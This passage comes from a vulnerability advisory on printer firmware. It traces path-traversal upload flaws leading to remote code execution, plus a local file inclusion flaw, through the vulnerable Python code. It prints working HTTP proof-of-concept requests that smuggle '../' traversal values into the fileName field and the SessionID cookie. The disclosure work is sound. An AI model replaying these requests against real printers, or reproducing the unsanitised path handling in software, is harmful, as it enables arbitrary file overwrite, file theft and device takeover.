 <span style="color: #666666">30</span>             storage_rootpath <span style="color: #666666">=</span> FileHandler<span style="color: #666666">.</span>getStorageRootPath(storage_type<span style="color: #666666">=</span><span style="color: #BA2121">&quot;normal&quot;</span>)
[<span style="color: #666666">...</span>]
 <span style="color: #666666">33</span>             <span style="color: #408080; font-style: italic"># configure file path that specified using File API</span>
 <span style="color: #666666">34</span>             payloads <span style="color: #666666">=</span> <span style="color: #008000">self</span><span style="color: #666666">.</span>request<span style="color: #666666">.</span>json_body                                         [<span style="color: #666666">1</span>] get value <span style="color: #008000; font-weight: bold">from</span> <span style="color: #0000FF; font-weight: bold">the</span> <span style="color: #0000FF; font-weight: bold">attacker</span>
 <span style="color: #666666">35</span>             Logger<span style="color: #666666">.</span>i(<span style="color: #BA2121">&quot;request body: &quot;</span> <span style="color: #666666">+</span> <span style="color: #008000">str</span>(payloads))
[<span style="color: #666666">...</span>]
 <span style="color: #666666">55</span>             command_path <span style="color: #666666">=</span> storage_rootpath <span style="color: #666666">+</span> <span style="color: #BA2121">&#39;/command/&#39;</span> <span style="color: #666666">+</span> <span style="color: #008000">str</span>(payloads[<span style="color: #BA2121">&quot;fileName&quot;</span>]) [<span style="color: #666666">2</span>] generate a path controlled by the attacker
 <span style="color: #666666">56</span>             <span style="color: #008000; font-weight: bold">with</span> <span style="color: #008000">open</span>(command_path<span style="color: #666666">.</span>encode(<span style="color: #BA2121">&#39;utf-8&#39;</span>), mode<span style="color: #666666">=</span><span style="color: #BA2121">&#39;wb&#39;</span>) <span style="color: #008000; font-weight: bold">as</span> _file:              [<span style="color: #666666">3</span>] <span style="color: #008000">open</span> this path
 <span style="color: #666666">57</span>                 _file<span style="color: #666666">.</span>write(binary_data)                                              [<span style="color: #666666">4</span>] write content to the path
[<span style="color: #666666">...</span>]
</pre></div>

<p>The vulnerable source code can be seen to:</p>
<ul>
<li>get value from the attacker on line 34</li>
<li>generate a path based on the value provided by the attacker on line 55</li>
<li>open this path on line 56</li>
<li>write content to the path on line 57</li>
</ul>
<p>A remote attacker can overwrite any Python file in the Remote Execution application (in <code>/application/app/10000000-0000-0000-0000-500000000000</code>) to get Remote Code Execution.</p>
<p><a id="rce-insecure-upload-02"></a></p>
<h2>Details - Remote Code Execution - insecure upload</h2>
<p>It was observed that the Remote Command program allows an attacker to get Remote Code Execution.</p>
<p>The Remote Command application allows uploading documents (as zip files) using the <code>/aplpx/server/10000000-0000-0000-0000-500000000000/remotecommand/settingapp/command/get_command_info</code> API. When sending a zip file with the filename <code>../</code>, it is possible to overwrite any file within the directory of the Python application.</p>
<p>Malicious HTTP request sent to the Remote Command application: </p>
<pre><code>POST /aplpx/server/10000000-0000-0000-0000-500000000000/remotecommand/settingapp/command/get_command_info HTTP/1.1
Host: 10.0.0.1:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 269
Origin: http://10.0.0.1:8080
Connection: close
Referer: http://10.0.0.1:8080/aplpx/client/10000000-0000-0000-0000-500000000000/index.html?v=1.0.8
Cookie: Locale=en-US,en#q=0.5; BrowserLang=en_US; pageTrack=MAIN%3DADMIN%26SUB%3DAPPLICATION%26CAT%3DAPPLINK; clicked=0; TopAccessURL=http%3A//10.0.0.1%3A8080/%3FMAIN%3DTOPACCESS; lastVisited=APPLINK; SessionID=Session_02b918cd-3074-4f4f-afd6-396ed3fb7f94; IgnoreSessionTimeout=1; Session=10.0.0.2.c57914f5d5c3263959918454856ac9f3

{"file":"UEsDBAoAAAAAAEMyilbGNbk7BQAAAAUAAAAIABwAdGVzdC50eHRVVAkAA13iM2Tu/TNkdXgLAAEE6AMAAAToAwAAdGVzdApQSwECHgMKAAAAAABDMopWxjW5OwUAAAAFAAAACAAYAAAAAAABAAAAgIEAAAAAdGVzdC50eHRVVAUAA13iM2R1eAsAAQToAwAABOgDAABQSwUGAAAAAAEAAQBOAAAARwAAAAAA","fileName":"test-get-cmd.zip"}
</code></pre>
<p>Such file will be stored inside <code>/application/app/10000000-0000-0000-0000-500000000000/appstorage/normal/command_info/test-get-cmd.zip</code>. Using <code>../</code> will allow an attacker to store the resulting file in an attacker-controlled path, overwriting Python scripts, for example.</p>
<p>The vulnerable code is located in the <code>/application/app/10000000-0000-0000-0000-500000000000/package/program/settingapp/server/views/command.py</code> Python script. The <code>fileName</code> value is controlled by the attacker on line 142:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  <span style="color: #666666">1</span> <span style="color: #408080; font-style: italic">#!/usr/bin/env python</span>
  <span style="color: #666666">2</span> <span style="color: #408080; font-style: italic"># -*- coding: utf-8 -*-</span>
  <span style="color: #666666">3</span> <span style="color: #408080; font-style: italic"># Copyright(c) 2021 Toshiba Tec Corporation, All Rights Reserved.</span>
[<span style="color: #666666">...</span>]
<span style="color: #666666">113</span>     <span style="color: #AA22FF">@view_config</span>(route_name<span style="color: #666666">=</span>View<span style="color: #666666">.</span>BASE_ROUTE_NAME <span style="color: #666666">+</span> <span style="color: #BA2121">&#39;get_command_info&#39;</span>, request_method<span style="color: #666666">=</span><span style="color: #BA2121">&#39;POST&#39;</span>)
<span style="color: #666666">114</span>     <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">get_command_info</span>(<span style="color: #008000">self</span>):
[<span style="color: #666666">...</span>]
<span style="color: #666666">127</span>             payloads <span style="color: #666666">=</span> <span style="color: #008000">self</span><span style="color: #666666">.</span>request<span style="color: #666666">.</span>json_body
[<span style="color: #666666">...</span>]
<span style="color: #666666">131</span>             storage_rootpath <span style="color: #666666">=</span> FileHandler<span style="color: #666666">.</span>getStorageRootPath(storage_type<span style="color: #666666">=</span><span style="color: #BA2121">&quot;normal&quot;</span>)
[<span style="color: #666666">...</span>]
<span style="color: #666666">141</span>             binary_data <span style="color: #666666">=</span> base64<span style="color: #666666">.</span>b64decode(payloads[<span style="color: #BA2121">&#39;file&#39;</span>]<span style="color: #666666">.</span>encode())
<span style="color: #666666">142</span>             command_path <span style="color: #666666">=</span> storage_rootpath <span style="color: #666666">+</span> <span style="color: #BA2121">&#39;/command_info/&#39;</span> <span style="color: #666666">+</span> <span style="color: #008000">str</span>(payloads[<span style="color: #BA2121">&quot;fileName&quot;</span>]) [<span style="color: #666666">1</span>] <span style="color: #008000">open</span> a <span style="color: #008000">file</span> <span style="color: #008000; font-weight: bold">with</span> the path controlled by the attacker
<span style="color: #666666">143</span>             <span style="color: #008000; font-weight: bold">with</span> <span style="color: #008000">open</span>(command_path<span style="color: #666666">.</span>encode(<span style="color: #BA2121">&#39;utf-8&#39;</span>), mode<span style="color: #666666">=</span><span style="color: #BA2121">&#39;wb&#39;</span>) <span style="color: #008000; font-weight: bold">as</span> _file:
<span style="color: #666666">144</span>                 _file<span style="color: #666666">.</span>write(binary_data)
[<span style="color: #666666">...</span>]
</pre></div>

<p>A remote attacker can overwrite any Python file in the Remote Execution application (in <code>/application/app/10000000-0000-0000-0000-500000000000</code>) to get Remote Code Execution.</p>
<p><a id="lfi"></a></p>
<h2>Details - Local File Inclusion</h2>
<p>It was observed that the Remote Command program allows an attacker to read any file using a Local File Inclusion vulnerability.</p>
<p>The Remote Command application allows retrieving files. Such code is implemented inside the <code>resultstorage</code> API.</p>
<p>The vulnerable code is located in the <code>/application/app/10000000-0000-0000-0000-500000000000/package/program/settingapp/server/views/resultstorage.py</code> Python script. The <code>filename</code> value is controlled by the attacker on line 21:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>[<span style="color: #666666">...</span>]
 <span style="color: #666666">16</span> <span style="color: #AA22FF">@view_config</span>(route_name<span style="color: #666666">=</span>View<span style="color: #666666">.</span>BASE_ROUTE_NAME <span style="color: #666666">+</span> <span style="color: #BA2121">&#39;resultstorage&#39;</span>)
 <span style="color: #666666">17</span> <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">resultGetStorageFileLink</span>(request):
 <span style="color: #666666">18</span>     <span style="color: #008000; font-weight: bold">try</span>:
 <span style="color: #666666">19</span>         Logger<span style="color: #666666">.</span>w(<span style="color: #008000">str</span>(request))
 <span style="color: #666666">20</span>         payloads <span style="color: #666666">=</span> request<span style="color: #666666">.</span>GET
 <span style="color: #666666">21</span>         filename <span style="color: #666666">=</span> payloads[<span style="color: #BA2121">&quot;filename&quot;</span>]
 <span style="color: #666666">22</span>         Logger<span style="color: #666666">.</span>w(filename)
 <span style="color: #666666">23</span>         rootpath <span style="color: #666666">=</span> FileHandler<span style="color: #666666">.</span>getStorageRootPath(<span style="color: #BA2121">&quot;normal&quot;</span>)
 <span style="color: #666666">24</span>
 <span style="color: #666666">25</span>         path <span style="color: #666666">=</span> glob<span style="color: #666666">.</span>glob(rootpath <span style="color: #666666">+</span> <span style="color: #BA2121">&#39;/*/&#39;</span> <span style="color: #666666">+</span> filename)
 <span style="color: #666666">26</span>         Logger<span style="color: #666666">.</span>w(<span style="color: #008000">str</span>(path))
 <span style="color: #666666">27</span>         res <span style="color: #666666">=</span> FileResponse(path[<span style="color: #666666">0</span>])
 <span style="color: #666666">28</span>         res<span style="color: #666666">.</span>content_type <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;application/zip&#39;</span>
 <span style="color: #666666">29</span>         res<span style="color: #666666">.</span>content_disposition <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;attachment; filename=&#39;</span><span style="color: #666666">+</span>filename
 <span style="color: #666666">30</span>         <span style="color: #008000; font-weight: bold">return</span> res
[<span style="color: #666666">...</span>]
</pre></div>

<p>The filename variable is provided by an attacker in the address (<code>?filename=/path/to/file</code>). This file will be opened and its content will be sent to the attacker, due to the use of <code>FileResponse()</code>, implemented in Pyramid.</p>
<p>An attacker can read any file on the printer.</p>
<p><a id="rce-insecure-upload-03"></a></p>
<h2>Details - Remote Code Execution - insecure upload</h2>
<p>It is possible to overwrite any file when installing a new application in Administration &gt; Application &gt; Application List &gt; Install Application:</p>
<p><img alt="" src="images/2024-toshiba-application-install-01.png" /></p>
<p><img alt="" src="images/2024-toshiba-application-install-02.png" /></p>
<p>When installing an application, several requests will be sent to the printer:</p>
<ol>
<li>the first request is a HTTP POST to <code>/tapy/server/appmgmt/uploadPackage</code>,</li>
<li>then a HTTP POST is sent to <code>/tapy/server/appmgmt/extractPackage</code>.</li>
</ol>
<p>The vulnerability can be found when the first HTTP POST is sent (to <code>/tapy/server/appmgmt/uploadPackage</code>).</p>
<p><img alt="" src="images/2024-toshiba-application-install-rce.png" /></p>
<p>The <code>/uploadPackage</code> route is defined in the <code>/registration/al/TopAccessPy/server/screenfacade/appmgmt/__init__.py</code> file to call the <code>upload_package</code> function:</p>
<p>Content of <code>/registration/al/TopAccessPy/server/screenfacade/appmgmt/__init__.py</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>[<span style="color: #666666">...</span>]
 <span style="color: #666666">11</span>   config<span style="color: #666666">.</span>add_route(<span style="color: #BA2121">&#39;upload_package&#39;</span>, <span style="color: #BA2121">&#39;uploadPackage&#39;</span>, xhr<span style="color: #666666">=</span><span style="color: #008000">False</span>)
[<span style="color: #666666">...</span>]
</pre></div>

<p>The implementation of the view is done in the <code>/registration/al/TopAccessPy/server/screenfacade/appmgmt/views.py</code> file:</p>
<p>3 important variables are set:</p>
<ul>
<li><code>SessionID</code> on line 179, retrieved from the cookie,</li>
<li><code>packagename</code> on line 188 retrieved from the POST-data,</li>
<li><code>package_file</code> on line 189 retrieved from the POST-data.</li>
</ul>
<p>Content of <code>/registration/al/TopAccessPy/server/screenfacade/appmgmt/views.py</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #666666">170</span> <span style="color: #AA22FF">@view_config</span>(route_name<span style="color: #666666">=</span><span style="color: #BA2121">&#39;upload_package&#39;</span>, xhr<span style="color: #666666">=</span><span style="color: #008000">False</span>, renderer<span style="color: #666666">=</span><span style="color: #BA2121">&#39;string&#39;</span>)
<span style="color: #666666">171</span> <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">upload_package</span>(request):
<span style="color: #666666">172</span>     log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;++++++++++++++++++++++++++++++++&quot;</span>)
<span style="color: #666666">173</span>     log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;upload_package : Start &quot;</span>)
<span style="color: #666666">174</span>     SessionID <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;&#39;</span>
<span style="color: #666666">175</span>     session <span style="color: #666666">=</span> <span style="color: #BA2121">&#39; &#39;</span>
<span style="color: #666666">176</span>     csrfpId <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;&#39;</span>
<span style="color: #666666">177</span>
<span style="color: #666666">178</span>     <span style="color: #008000; font-weight: bold">if</span> <span style="color: #BA2121">&#39;SessionID&#39;</span> <span style="color: #AA22FF; font-weight: bold">in</span> request<span style="color: #666666">.</span>cookies:
<span style="color: #666666">179</span>         SessionID <span style="color: #666666">=</span> request<span style="color: #666666">.</span>cookies[<span style="color: #BA2121">&#39;SessionID&#39;</span>] <span style="color: #666666">&lt;---------------</span> SessionID <span style="color: #AA22FF; font-weight: bold">is</span> retrieved <span style="color: #008000; font-weight: bold">from</span> <span style="color: #0000FF; font-weight: bold">the</span> <span style="color: #0000FF; font-weight: bold">cookie</span>
<span style="color: #666666">180</span>     <span style="color: #008000; font-weight: bold">if</span> <span style="color: #BA2121">&#39;Session&#39;</span> <span style="color: #AA22FF; font-weight: bold">in</span> request<span style="color: #666666">.</span>cookies:
<span style="color: #666666">181</span>         session <span style="color: #666666">=</span> request<span style="color: #666666">.</span>cookies[<span style="color: #BA2121">&#39;Session&#39;</span>]
<span style="color: #666666">182</span>     <span style="color: #008000; font-weight: bold">if</span> <span style="color: #BA2121">&#39;txtCSRFPID&#39;</span> <span style="color: #AA22FF; font-weight: bold">in</span> request<span style="color: #666666">.</span>POST:
<span style="color: #666666">183</span>         csrfpId <span style="color: #666666">=</span> request<span style="color: #666666">.</span>POST[<span style="color: #BA2121">&#39;txtCSRFPID&#39;</span>]
<span style="color: #666666">184</span>
<span style="color: #666666">185</span>     log<span style="color: #666666">.</span>info(<span style="color: #BA2121">&#39;Session ID obtained from request :&#39;</span> <span style="color: #666666">+</span> SessionID)
<span style="color: #666666">186</span>     log<span style="color: #666666">.</span>info(<span style="color: #BA2121">&#39;csrfpId obtained from request:&#39;</span> <span style="color: #666666">+</span> csrfpId)
<span style="color: #666666">187</span>
<span style="color: #666666">188</span>     packagename <span style="color: #666666">=</span> request<span style="color: #666666">.</span>POST[<span style="color: #BA2121">&#39;txtSelectedFileName&#39;</span>] <span style="color: #666666">&lt;----------</span> packagename <span style="color: #AA22FF; font-weight: bold">is</span> retrieved <span style="color: #008000; font-weight: bold">from</span> <span style="color: #0000FF; font-weight: bold">the</span> <span style="color: #0000FF; font-weight: bold">POST</span><span style="color: #666666">-</span>data
<span style="color: #666666">189</span>     package_file <span style="color: #666666">=</span> request<span style="color: #666666">.</span>POST[<span style="color: #BA2121">&#39;idFileName&#39;</span>]<span style="color: #666666">.</span>file <span style="color: #666666">&lt;-------------</span> package_file <span style="color: #AA22FF; font-weight: bold">is</span> retrieved <span style="color: #008000; font-weight: bold">from</span> <span style="color: #0000FF; font-weight: bold">the</span> <span style="color: #0000FF; font-weight: bold">POST</span><span style="color: #666666">-</span>data
<span style="color: #666666">190</span>
<span style="color: #666666">191</span>     validationMap <span style="color: #666666">=</span> applicationManagementModel<span style="color: #666666">.</span>validate_user(SessionID, session, csrfpId)
<span style="color: #666666">192</span>
<span style="color: #666666">193</span>     <span style="color: #008000; font-weight: bold">if</span> validationMap[<span style="color: #BA2121">&#39;VALIDATION_STATUS&#39;</span>] <span style="color: #666666">==</span> <span style="color: #BA2121">&#39;PASSED&#39;</span>:
<span style="color: #666666">194</span>         log<span style="color: #666666">.</span>info(<span style="color: #BA2121">&#39;User Validation : SUCCESS&#39;</span>)
<span style="color: #666666">195</span>         data <span style="color: #666666">=</span> applicationManagementModel<span style="color: #666666">.</span>upload_package(packagename, package_file, SessionID)
<span style="color: #666666">196</span>         <span style="color: #408080; font-style: italic">#log.info(&quot;Response recieved in an attempt to upload &quot; : &quot; + str(data))</span>
<span style="color: #666666">197</span>         log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;upload_package : End &quot;</span>)
<span style="color: #666666">198</span>         log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;++++++++++++++++++++++++++++++++&quot;</span>)
<span style="color: #666666">199</span>         <span style="color: #008000; font-weight: bold">return</span> data
<span style="color: #666666">200</span>     <span style="color: #008000; font-weight: bold">else</span>:
<span style="color: #666666">201</span>         log<span style="color: #666666">.</span>info(<span style="color: #BA2121">&#39;User Validation : FAILURE&#39;</span>)
<span style="color: #666666">202</span>         log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;upload_package : End &quot;</span>)
<span style="color: #666666">203</span>         <span style="color: #008000; font-weight: bold">if</span> <span style="color: #BA2121">&quot;HTTP_REQUEST_FORBIDDEN&quot;</span> <span style="color: #AA22FF; font-weight: bold">in</span> validationMap:
<span style="color: #666666">204</span>             <span style="color: #008000; font-weight: bold">return</span> HTTPForbidden(<span style="color: #BA2121">&quot;Error 403 : Forbidden Request&quot;</span>)
<span style="color: #666666">205</span>         <span style="color: #008000; font-weight: bold">else</span>:
<span style="color: #666666">206</span>             <span style="color: #008000; font-weight: bold">return</span> json<span style="color: #666666">.</span>dumps(validationMap)
</pre></div>

<p>During the execution flow, on line 191, the method <code>validate_user()</code> is called but <code>SessionID</code> is never used, except for printing it in the logs:</p>
<p>Content of <code>/registration/al/TopAccessPy/server/screenfacade/appmgmt/applicationmanager.py</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #666666">388</span>     <span style="color: #AA22FF">@classmethod</span>
<span style="color: #666666">389</span>     <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">validate_user</span>(<span style="color: #008000">cls</span>, sessionId, session, csrfpid):
<span style="color: #666666">390</span>         log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;applicationManagementModel: validate_user start&quot;</span>)
<span style="color: #666666">391</span>         log<span style="color: #666666">.</span>info(<span style="color: #BA2121">&quot;Session ID recieved   : &quot;</span> <span style="color: #666666">+</span> sessionId)
</pre></div>

<p>The execution flow then continues to line 195 with the call the method <code>upload_package</code> implemented in the <code>/registration/al/TopAccessPy/server/screenfacade/appmgmt/applicationmanager.py</code> file, with the 3 attacker-controlled variables:</p>
<ul>
<li><code>SessionID</code></li>
<li><code>packagename</code></li>
<li><code>package_file</code></li>
</ul>
<p>Content of <code>/registration/al/TopAccessPy/server/screenfacade/appmgmt/applicationmanager.py</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #666666">464</span>     <span style="color: #AA22FF">@classmethod</span>
<span style="color: #666666">465</span>     <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">upload_package</span>(<span style="color: #008000">cls</span>, packagename, package_file, SessionID):
<span style="color: #666666">466</span>         log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;applicationManagementModel: upload_package start&quot;</span>)
<span style="color: #666666">467</span>
<span style="color: #666666">468</span>         upload_destination <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;/work/al/tmp/upload/&#39;</span> <span style="color: #666666">+</span> SessionID <span style="color: #666666">+</span> <span style="color: #BA2121">&#39;/&#39;</span>
<span style="color: #666666">469</span>         <span style="color: #008000; font-weight: bold">if</span> <span style="color: #AA22FF; font-weight: bold">not</span> os<span style="color: #666666">.</span>path<span style="color: #666666">.</span>exists(upload_destination):
<span style="color: #666666">470</span>             os<span style="color: #666666">.</span>makedirs(upload_destination)
<span style="color: #666666">471</span>
<span style="color: #666666">472</span>         <span style="color: #008000; font-weight: bold">try</span>:
<span style="color: #666666">473</span>             log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;  upload_package start&quot;</span>)
<span style="color: #666666">474</span>             <span style="color: #408080; font-style: italic">#if type(packagename) == str:</span>
<span style="color: #666666">475</span>             <span style="color: #408080; font-style: italic">#packagename = unicode(packagename, &quot;utf-8&quot;, errors=&quot;ignore&quot;)</span>
<span style="color: #666666">476</span>             <span style="color: #408080; font-style: italic">#else:</span>
<span style="color: #666666">477</span>                 <span style="color: #408080; font-style: italic">#packagename = unicode(packagename)</span>
<span style="color: #666666">478</span>             log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;  upload_package start -- test end&quot;</span>)
<span style="color: #666666">479</span>             <span style="color: #408080; font-style: italic">#absolute_package_path = os.path.join(upload_destination , packagename).encode()</span>
<span style="color: #666666">480</span>             absolute_package_path <span style="color: #666666">=</span> <span style="color: #008000">str</span>(os<span style="color: #666666">.</span>path<span style="color: #666666">.</span>join(upload_destination , <span style="color: #008000">str</span>(packagename<span style="color: #666666">.</span>encode(<span style="color: #BA2121">&#39;ascii&#39;</span>,<span style="color: #BA2121">&#39;ignore&#39;</span>))))
<span style="color: #666666">481</span>             <span style="color: #008000; font-weight: bold">with</span> <span style="color: #008000">open</span>(absolute_package_path, <span style="color: #BA2121">&#39;wb&#39;</span>) <span style="color: #008000; font-weight: bold">as</span> output_file:
<span style="color: #666666">482</span>                 shutil<span style="color: #666666">.</span>copyfileobj(package_file, output_file)
<span style="color: #666666">483</span>
<span style="color: #666666">484</span>             <span style="color: #008000; font-weight: bold">return</span> <span style="color: #BA2121">&quot;SUCCESS&quot;</span>
<span style="color: #666666">485</span>
<span style="color: #666666">486</span>         <span style="color: #008000; font-weight: bold">except</span> <span style="color: #D2413A; font-weight: bold">Exception</span> <span style="color: #008000; font-weight: bold">as</span> err:
<span style="color: #666666">487</span>             log<span style="color: #666666">.</span>exception(<span style="color: #BA2121">&quot;Error In exitApp(upload_file) : &quot;</span> <span style="color: #666666">+</span> <span style="color: #008000">str</span>(err))
<span style="color: #666666">488</span>             <span style="color: #008000; font-weight: bold">return</span> <span style="color: #BA2121">&quot;FAILURE&quot;</span>
</pre></div>

<p>As shown previously, the attacker has full control over these 3 variables:</p>
<ul>
<li><code>SessionID</code> (views.py:179 from the Cookie <code>SessionID</code> variable)</li>
<li><code>packagename</code> (views.py:188 from the POST-data <code>txtSelectedFileName</code> variable)</li>
<li><code>package_file</code> (views.py:189 from the POST-data <code>idFileName</code> variable)</li>
</ul>
<p>These 3 variables are not filtered and can contain any value.</p>
<p>In the HTTP request, the <code>Session</code> cookie is used to check the authorisation but the <code>SessionID</code> can be set to anything as shown previously (it is not used in the <code>validate_user</code> method). This <code>SessionID</code> value is used to store the resulting file (on line 468) without any filtering.</p>
<p>The execution flow is below:</p>
<pre><code>465     def upload_package(cls, packagename, package_file, SessionID):
[...]

-- SessionID controlled by an attacker, the upload_destination variable contains /work/al/tmp/upload/ + SessionID + /

468         upload_destination = '/work/al/tmp/upload/' + SessionID + '/'
[...]

-- absolute_file_path contains /work/al/tmp/upload/ + SessionID + / + packagename

480             absolute_package_path = str(os.path.join(upload_destination , str(packagename.encode('ascii','ignore'))))
481             with open(absolute_package_path, 'wb') as output_file:

-- and the uploaded file is then stored inside /work/al/tmp/upload/ + SessionID + packagename

482                 shutil.copyfileobj(package_file, output_file)
</code></pre>
<p>An attacker can then set <code>SessionID=../../path/to/any/file</code> in the HTTP request to overwrite any file.</p>
<p>Finally, the method <code>upload_file_to_session_folder</code> is also vulnerable (this method is similar to the <code>upload_package</code> method):</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #666666">437</span>     <span style="color: #AA22FF">@classmethod</span>
<span style="color: #666666">438</span>     <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">upload_file_to_session_folder</span>(<span style="color: #008000">cls</span>, filename, fileObj, SessionID):
<span style="color: #666666">439</span>         log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;applicationManagementModel: upload_file_to_session_folder start&quot;</span>)
<span style="color: #666666">440</span>         responseMap <span style="color: #666666">=</span> {}
<span style="color: #666666">441</span>
<span style="color: #666666">442</span>         upload_destination <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;/work/al/tmp/upload/&#39;</span> <span style="color: #666666">+</span> SessionID <span style="color: #666666">+</span> <span style="color: #BA2121">&#39;/&#39;</span>
<span style="color: #666666">443</span>         <span style="color: #008000; font-weight: bold">if</span> <span style="color: #AA22FF; font-weight: bold">not</span> os<span style="color: #666666">.</span>path<span style="color: #666666">.</span>exists(upload_destination):
<span style="color: #666666">444</span>             os<span style="color: #666666">.</span>makedirs(upload_destination)
<span style="color: #666666">445</span>
<span style="color: #666666">446</span>         <span style="color: #008000; font-weight: bold">try</span>:
<span style="color: #666666">447</span>             absolute_file_path <span style="color: #666666">=</span> <span style="color: #008000">str</span>(os<span style="color: #666666">.</span>path<span style="color: #666666">.</span>join(upload_destination , <span style="color: #008000">str</span>(filename<span style="color: #666666">.</span>encode(<span style="color: #BA2121">&#39;ascii&#39;</span>,<span style="color: #BA2121">&#39;ignore&#39;</span>))))
<span style="color: #666666">448</span>             responseMap[<span style="color: #BA2121">&quot;ABSOLUTE_FILE_PATH&quot;</span>] <span style="color: #666666">=</span> absolute_file_path
<span style="color: #666666">449</span>             log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;absolute_file_path : &quot;</span> <span style="color: #666666">+</span> <span style="color: #008000">str</span>(absolute_file_path))
<span style="color: #666666">450</span>             <span style="color: #008000; font-weight: bold">with</span> <span style="color: #008000">open</span>(absolute_file_path, <span style="color: #BA2121">&#39;wb&#39;</span>) <span style="color: #008000; font-weight: bold">as</span> output_file:
<span style="color: #666666">451</span>                 shutil<span style="color: #666666">.</span>copyfileobj(fileObj, output_file)
<span style="color: #666666">452</span>
<span style="color: #666666">453</span>             log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;File upload to session folder completed&quot;</span>)
<span style="color: #666666">454</span>             log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;applicationManagementModel: upload_file_to_session_folder end&quot;</span>)
<span style="color: #666666">455</span>             responseMap[<span style="color: #BA2121">&quot;STATUS&quot;</span>] <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;SUCCESS&quot;</span>
<span style="color: #666666">456</span>             <span style="color: #008000; font-weight: bold">return</span> responseMap
<span style="color: #666666">457</span>
<span style="color: #666666">458</span>         <span style="color: #008000; font-weight: bold">except</span> <span style="color: #D2413A; font-weight: bold">Exception</span> <span style="color: #008000; font-weight: bold">as</span> err:
<span style="color: #666666">459</span>             log<span style="color: #666666">.</span>exception(<span style="color: #BA2121">&quot;Error In exitApp(upload_file_to_session_folder) : &quot;</span> <span style="color: #666666">+</span> <span style="color: #008000">str</span>(err))
<span style="color: #666666">460</span>             responseMap[<span style="color: #BA2121">&quot;STATUS&quot;</span>] <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;FAILURE&quot;</span>
<span style="color: #666666">461</span>             log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;applicationManagementModel: upload_file_to_session_folder end&quot;</span>)
<span style="color: #666666">462</span>             <span style="color: #008000; font-weight: bold">return</span> responseMap
<span style="color: #666666">463</span>
</pre></div>

<p>PoC:</p>
<p>When setting the SessionID value to <code>../../../../dev/shm/</code>, we can see the resulting file <code>/dev/shm/b'upload-2.txt'</code> written instead of being stored inside <code>/work/al/tmp/upload/' + SessionID</code>:</p>
<pre><code>POST /tapy/server/appmgmt/uploadPackage HTTP/1.1
Host: 10.0.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------4065413143858317480519150484
Content-Length: 529
Origin: http://10.0.0.1
Connection: close
Referer: http://10.0.0.1/tapy/client/appmgmt/InstallApplication.html?v=1670357577ta
Cookie: Locale=en-US,en#q=0.5; BrowserLang=en_US; pageTrack=MAIN%3DADMIN%26SUB%3DAPPLICATION%26CAT%3DAPPLINK; TopAccessURL=http%3A//10.0.0.1/%3FMAIN%3DTOPACCESS; SessionID=../../../../dev/shm/; clicked=0; lastVisited=APPLINK; IgnoreSessionTimeout=1; Session=10.0.0.2.5389297fae5d47f2c3bbf71fbeefbe5b
Upgrade-Insecure-Requests: 1

-----------------------------4065413143858317480519150484
Content-Disposition: form-data; name="txtCSRFPID"

10.0.0.2.5389297fae5d47f2c3bbf71fbeefbe5b
-----------------------------4065413143858317480519150484
Content-Disposition: form-data; name="txtSelectedFileName"

upload-2.txt
-----------------------------4065413143858317480519150484
Content-Disposition: form-data; name="idFileName"; filename="upload.txt"
Content-Type: text/plain

hi

-----------------------------4065413143858317480519150484--
</code></pre>
<p>And we can find the resulting file in /dev/shm:</p>
<pre><code>bash-4.1# ls -latr /dev/shm
total 2908
----rw----  1 root   trusted      16 Oct 27 02:15 sem.ssdktime.lock
----rw----  1 root   trusted      16 Oct 27 02:15 sem.ssdk.mutex
----rw----  1 root   trusted      16 Oct 27 02:15 sem.ssdk.lock
----rw----  1 root   trusted      16 Oct 27 02:15 sem.ssdktempdb
----rw----  1 root   trusted      16 Oct 27 02:15 sem.ssdkimagetempdb
----rw----  1 root   trusted      16 Oct 27 02:15 sem.ssdkdebugsettings.lock
